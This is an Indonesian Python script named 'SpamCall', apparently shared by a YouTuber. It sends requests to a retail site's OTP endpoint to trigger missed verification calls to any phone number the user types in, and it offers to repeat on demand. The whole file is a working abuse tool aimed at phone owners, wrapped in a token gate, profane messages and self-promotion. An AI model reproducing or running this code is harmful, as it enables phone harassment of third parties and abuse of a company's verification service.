# Recoder Anjing Mau Apa Lu ? Recode ?
# gw pusing buat nya, yg rikod juga tentunya harus pusing :v
# Only Python3

# Start : 30-03-2021 16:32 WIB
# Done  : 30-03-2021 17-03 WIB
# By    : Kingtebe

import os
import sys
import json
import hashlib
from time import sleep
from random import choice as acak
try:
	import requests as eek
except ModuleNotFoundError:
	exit(
		f"\n \x1b[97m[\x1b[95m!\x1b[97m] Mengentod install dulu module requests nya\n     Ketik \x1b[90m: \x1b[93mpip install requests\n\x1b[97m"
	)

_hemkel_ni_bos = lambda: print(
				f"\n {white} Download Dulu Token Nya Ngab\n  Get Token ⟨ {green}https://realsht.mobi/zGoX1 {white}⟩\n"
	);_hemkel_pro_bos = lambda: print(
			f"{purple}  _____                       _____       _ _\n{purple} /  ___|                     /  __ \     | | |\n{purple} \ `--. _ __   __ _ _ __ ___ | /  \/ __ _| | |\n{purple}  `--. \ '_ \ / _` | '_ ` _ \| |    / _` | | |\n{purple} /\__/ / |_) | (_| | | | | | | \__/\ (_| | | |\n{purple} \____/| .__/ \__,_|_| |_| |_|\____/\__,_|_|_|\n{purple}       | |\n{purple}       |_|  {white}By {black}: {white}Kingtebe {green}| {white}Yt {black}: {white}FaaL TV\n"
)

List_Agent = [

	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
]

exec(
	open(
		"etc/color"
		).read(
	)
)

class Wa:

	def __init__(
			self
			):
		self.Agent = acak(
				List_Agent
			)
		self.LonLine()

	def LonLine(
		self
			):

		_list_pwd = hashlib.md5(
					b"no_rename.json"
					).hexdigest(

				)
		__import__(
				"os"
					).system(
						"clear"
				);_hemkel_pro_bos(
			);_hemkel_ni_bos(
		)

		pwd = input(
				f"\n {white}[{purple}◈{white}] Your Token {black}: {yellow}"
			)
		if pwd in _list_pwd:
			sleep(
				3
			)
			print(
				f" {white}[{green}✓{white}] Token Succsesfully"
		);sleep(
			2
	)
			self.Main()
		else:
			sleep(
				2
			)
			print(
				f" {white}[{red}!{white}] Token Wrong "
		);sleep(
			2
	);exit(
)

	def Main(
		self
			):
		try:
			__import__(
					"os"
						).system(
							"clear"
					);_hemkel_pro_bos(
			);print(
				f"\n {white}[{purple}◈{white}] Contoh {black}: {white}8212xxx"
		)
			self.phone = str(
					input(
						f" {white}[{purple}◈{white}] {white}Target {black}: {yellow}"
					)
				);print(
					f"{white}"
			)
			if self.phone in(
					""
				):exit(
					f" {green}[ {white}Warning {red}! {white}Harap Isi No Nya Nyet {green}]{white}\n"
			)

			elif self.phone in open(
						"etc/myphone","r"
						).read(
					):
				print(
					f" {green}[ {white}Warning {red}! {white}Awokawokawok ngentod jangan spam ke no aing asu {green}]{white}\n"
			);exit(
		)
			elif self.phone.startswith(
							"8"
					):

				for coli in range(1):
					_api_url = eek.post(
						f"https://www.nutriclub.co.id/otp/?phone=0{self.phone}&old_phone=0{self.phone}",headers={"Host":"www.nutriclub.co.id","content-length":"0","accept":"application/json, text/javascript, */*; q=0.01","x-requested-with":"XMLHttpRequest","save-data":"on","User-Agent":self.Agent,"origin":"https://www.nutriclub.co.id"})
					if json.loads(
							_api_url.text
						)[
						"StatusMessage"
					] in "Request misscall berhasil":
						print(
							"request {\n\n           [phone] => "+ self.phone +"\n           [status] => Succses\n\n    \x1b[97m[ \x1b[92mSubscribe Youtube Channel FaaL TV \x1b[97m]\n\x1b[97m}\n"
						)
					else:
						print(
							"request {\n\n           [phone] => "+ self.phone +"\n           [status] => Failed\n\n    \x1b[97m[ \x1b[92mSubscribe Youtube Channel FaaL TV \x1b[97m]\n\x1b[97m}\n"
					)
				exnx=input(
						f"{white}[{yellow}?{white}] Call Lagi ?\n{white}[y{yellow}/{white}n]\n{yellow}•{white}> {black}: {white}"
				)
				if exnx in (
						"y","Y"
					):self.Main(
			)
				elif exnx in (
						"n","N"
					):pass
			else:
				print(
					f"\n {purple}[ {white}Warning {red}! {white}Harap input no dengan angka awalan 8 nyet {purple}]{white}\n"
			)
		except KeyboardInterruptError:
			exit(
		)

if __name__=='__main__':
	Wa()
